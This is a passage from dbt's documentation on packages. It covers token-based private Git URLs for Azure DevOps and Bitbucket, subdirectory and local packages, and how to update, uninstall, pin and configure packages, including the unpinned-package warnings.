Read more about creating a GitLab Deploy Token [here](https://docs.gitlab.com/ee/user/project/deploy_tokens/#creating-a-deploy-token) and how to properly construct your HTTPS URL [here](https://docs.gitlab.com/ee/user/project/deploy_tokens/#git-clone-a-repository). Deploy tokens can be managed by Maintainers only.

In Azure DevOps:

packages.yml
```
packages:
  - git: "https://{{env_var('DBT_ENV_SECRET_PERSONAL_ACCESS_TOKEN')}}@dev.azure.com/dbt-labs/awesome_project/_git/awesome_repo" # git HTTPS URL

```

Read more about creating a Personal Access Token [here](https://docs.microsoft.com/en-us/azure/devops/organizations/accounts/use-personal-access-tokens-to-authenticate?view=azure-devops&tabs=preview-page#create-a-pat).

In Bitbucket:

packages.yml
```
packages:
  - git: "https://{{env_var('DBT_USER_NAME')}}:{{env_var('DBT_ENV_SECRET_PERSONAL_ACCESS_TOKEN')}}@bitbucketserver.com/scm/awesome_project/awesome_repo.git" # for Bitbucket Server

```

Read more about creating a Personal Access Token [here](https://confluence.atlassian.com/bitbucketserver/personal-access-tokens-939515499.html).

## Configure subdirectory for packaged projects[​](/docs/build/packages#configure-subdirectory-for-packaged-projects "Direct link to Configure subdirectory for packaged projects")

In general, dbt expects `dbt_project.yml` to be located as a top-level file in a package. If the packaged project is instead nested in a subdirectory—perhaps within a much larger mono repo—you can optionally specify the folder path as `subdirectory`. dbt will attempt a [sparse checkout](https://git-scm.com/docs/git-sparse-checkout) of just the files located within that subdirectory. Note that you must be using a recent version of `git` (`>=2.26.0`).

packages.yml
```
packages:
  - git: "https://github.com/dbt-labs/dbt-labs-experimental-features" # git URL
    subdirectory: "materialized-views" # name of subdirectory containing `dbt_project.yml`

```
### Local packages[​](/docs/build/packages#local-packages "Direct link to Local packages")

A "local" package is a dbt project accessible from your local file system. You can install it by specifying the project's path. It works best when you nest the project within a subdirectory relative to your current project's directory.

packages.yml
```
packages:
  - local: relative/path/to/subdirectory

```

Other patterns may work in some cases, but not always. For example, if you install this project as a package elsewhere, or try running it on a different system, the relative and absolute paths will yield the same results.

packages.yml
```
packages:
  # not recommended - support for these patterns vary
  - local: /../../redshift   # relative path to a parent directory
  - local: /opt/dbt/redshift # absolute path on the system

```

There are a few specific use cases where we recommend using a "local" package:

1. **Monorepo** — When you have multiple projects, each nested in a subdirectory, within a monorepo. "Local" packages allow you to combine projects for coordinated development and deployment.
2. **Testing changes** — To test changes in one project or package within the context of a downstream project or package that uses it. By temporarily switching the installation to a "local" package, you can make changes to the former and immediately test them in the latter for quicker iteration. This is similar to [editable installs](https://pip.pypa.io/en/stable/topics/local-project-installs/) in Python.
3. **Nested project** — When you have a nested project that defines fixtures and tests for a project of utility macros, like [the integration tests within the `dbt-utils` package](https://github.com/dbt-labs/dbt-utils/tree/main/integration_tests).

## What packages are available?[​](/docs/build/packages#what-packages-are-available "Direct link to What packages are available?")

Check out [dbt Hub](https://hub.getdbt.com) to see the library of published dbt packages!

## Advanced package configuration[​](/docs/build/packages#advanced-package-configuration "Direct link to Advanced package configuration")

### Updating a package[​](/docs/build/packages#updating-a-package "Direct link to Updating a package")

When you update a version or revision in your `packages.yml` file, it isn't automatically updated in your dbt project. You should run `dbt deps` to update the package. You may also need to run a [full refresh](/reference/commands/run) of the models in this package.

### Uninstalling a package[​](/docs/build/packages#uninstalling-a-package "Direct link to Uninstalling a package")

When you remove a package from your `packages.yml` file, it isn't automatically deleted from your dbt project, as it still exists in your `dbt_packages/` directory. If you want to completely uninstall a package, you should either:

* delete the package directory in `dbt_packages/`; or
* run `dbt clean` to delete *all* packages (and any compiled models), followed by `dbt deps`.

### Pinning packages[​](/docs/build/packages#pinning-packages "Direct link to Pinning packages")

Beginning with v1.7, running [`dbt deps`](/reference/commands/deps) "pins" each package by creating or updating the `package-lock.yml` file in the *project\_root* where `packages.yml` is recorded.

* The `package-lock.yml` file contains a record of all packages installed.
* If subsequent `dbt deps` runs contain no changes to `dependencies.yml` or `packages.yml`, dbt-core installs from `package-lock.yml`.

For example, if you use a branch name, the `package-lock.yml` file pins to the head commit. If you use a version range, it pins to the latest release. In either case, subsequent commits or versions will **not** be installed. To get new commits or versions, run `dbt deps --upgrade` or add `package-lock.yml` to your .gitignore file.

As of v0.14.0, dbt will warn you if you install a package using the `git` syntax without specifying a revision (see below).

### Configuring packages[​](/docs/build/packages#configuring-packages "Direct link to Configuring packages")

You can configure the models and seeds in a package from the `dbt_project.yml` file, like so:

dbt\_project.yml
```

vars:
  snowplow:
    'snowplow:timezone': 'America/New_York'
    'snowplow:page_ping_frequency': 10
    'snowplow:events': "{{ ref('sp_base_events') }}"
    'snowplow:context:web_page': "{{ ref('sp_base_web_page_context') }}"
    'snowplow:context:performance_timing': false
    'snowplow:context:useragent': false
    'snowplow:pass_through_columns': []

models:
  snowplow:
    +schema: snowplow

seeds:
  snowplow:
    +schema: snowplow_seeds

```

For example, when using a dataset specific package, you may need to configure variables for the names of the tables that contain your raw data.

Configurations made in your `dbt_project.yml` file will override any configurations in a package (either in the `dbt_project.yml` file of the package, or in config blocks).

### Specifying unpinned Git packages[​](/docs/build/packages#specifying-unpinned-git-packages "Direct link to Specifying unpinned Git packages")

If your project specifies an "unpinned" Git package, you may see a warning like:

```
The git package "https://github.com/dbt-labs/dbt-utils.git" is not pinned.
This can introduce breaking changes into your project without warning!

```

This warning can be silenced by setting `warn-unpinned: false` in the package specification. **Note:** This is not recommended.

packages.yml
```
packages:
  - git: https://github.com/dbt-labs/dbt-utils.git
    warn-unpinned: false

```
### Setting two-part versions[​](/docs/build/packages#setting-two-part-versions "Direct link to Setting two-part versions")

In dbt v0.17.0 *only*, if the package version you want is only specified as `major`.`minor`, as opposed to `major.minor.patch`, you may get an error that `1.0 is not of type 'string'`. In that case you will have to tell dbt that your version number is a string. This issue was resolved in v0.17.1 and all subsequent versions.

packages.yml
```
packages:
 - git: https://github.com/dbt-labs/dbt-codegen.git
   version: "{{ 1.0 | as_text }}"

```
0[Edit this page](https://github.com/dbt-labs/docs.getdbt.com/edit/current/website/docs/docs/build/packages.md)Last updated on **Jan 9, 2025**[PreviousEnvironment variables](/docs/build/environment-variables)[NextHooks and operations](/docs/build/hooks-operations)

* [Use cases](/docs/build/packages#use-cases)
* [How do I add a package to my project?](/docs/build/packages#how-do-i-add-a-package-to-my-project)
* [How do I specify a package?](/docs/build/packages#how-do-i-specify-a-package)
  + [Hub packages (recommended)](/docs/build/packages#hub-packages-recommended)
  + [Git packages](/docs/build/packages#git-packages)
  + [Internally hosted tarball URL](/docs/build/packages#internally-hosted-tarball-url)
* [Private packages](/docs/build/packages#private-packages)
  + [Native private packages](/docs/build/packages#native-private-packages-)
  + [SSH key method (command line only)](/docs/build/packages#ssh-key-method-command-line-only)
  + [Git token method](/docs/build/packages#git-token-method)
* [Configure subdirectory for packaged projects](/docs/build/packages#configure-subdirectory-for-packaged-projects)
  + [Local packages](/docs/build/packages#local-packages)
* [What packages are available?](/docs/build/packages#what-packages-are-available)
* [Advanced package configuration](/docs/build/packages#advanced-package-configuration)
  + [Updating a package](/docs/build/packages#updating-a-package)
  + [Uninstalling a package](/docs/build/packages#uninstalling-a-package)
  + [Pinning packages](/docs/build/packages#pinning-packages)
  + [Configuring packages](/docs/build/packages#configuring-packages)
  + [Specifying unpinned Git packages](/docs/build/packages#specifying-unpinned-git-packages)
  + [Setting two-part versions](/docs/build/packages#setting-two-part-versions)

[Edit this page](https://github.com/dbt-labs/docs.getdbt.com/edit/current/website/docs/docs/build/packages.md)

[Terms of Service](https://www.getdbt.com/terms-of-use/)
[Privacy Policy](https://www.getdbt.com/cloud/privacy-policy/)
[Security](https://www.getdbt.com/security/)
Cookie Settings

© 2025 dbt Labs, Inc. All Rights Reserved.

